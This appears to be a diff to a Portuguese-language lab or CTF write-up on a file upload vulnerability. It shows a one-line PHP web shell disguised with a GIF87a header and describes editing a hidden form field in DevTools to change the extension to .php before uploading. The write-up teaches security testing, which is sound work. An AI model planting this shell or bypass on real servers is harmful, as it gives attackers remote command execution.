@@ -551,5 +551,14 @@ Para isso, utilizamos o seguinte código PHP:
 
 `GIF87a<?php echo shell_exec($_GET['e'].' 2>&1'); ?>`
 
-> A assinatura GIF87a  de um __GIF (Graphics Interchange Format)__. 
+> GIF87a pertence ao tipo de arquivo __GIF (Graphics Interchange Format)__.
+
+Após isso, abrimos as ferramentas de DevTools e alteramos o elemento do formulário HTML de ``<input type="hidden" name="filename" value="abc123.jpg">`` para `<input type="hidden" name="filename" value="abc123.php>`.
+
+<img width="1291" height="560" alt="Captura de tela 2025-12-01 231824" src="https://github.com/user-attachments/assets/29f0bad7-be88-421a-ad84-856efe6e1b42" />
+
+Após editar o formulário e alterar a extensão para `.php`, realizamos o upload do arquivo para o servidor. Em seguida, acessamos o link gerado pelo upload, onde somos redirecionados para outra página com as seguintes informações:
+
+<img width="836" height="67" alt="Captura de tela 2025-12-01 232126" src="https://github.com/user-attachments/assets/03fac6a8-d3b6-47fb-8c7e-39d9c00fc2f3" />
+
 
